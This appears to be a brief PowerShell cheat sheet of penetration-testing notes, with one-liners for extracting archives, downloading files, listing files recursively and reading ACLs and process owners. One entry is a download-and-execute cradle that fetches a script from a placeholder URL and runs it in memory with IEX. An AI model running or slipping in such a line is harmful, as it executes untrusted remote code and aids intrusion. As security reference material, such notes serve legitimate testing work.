# Extract zip file
`Expand-Archive <FILE>.zip`

# Download to disk
## using .Net WebClient:
`(New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)`

## using Invoke-WebRequest
`IWR '<URL>' -OutFile <FILENAME>`

# Execute powershell in memory
`(New-Object Net.WebClient).DownloadString('<URL>') | IEX`

# Get files only in a directory
`(ls -File -Recurse -Force -EA SilentlyContinue).fullname`

# find OS architecture
`$env:processor_architecture`

# Get ACL
`Get-ACL <PATH_TO_FILE> | Select -Exp AccessToString`

# Get Process Owners
`Get-WmiObject -class win32_process | select name,@{n='owner';e={$_.getowner().user}}`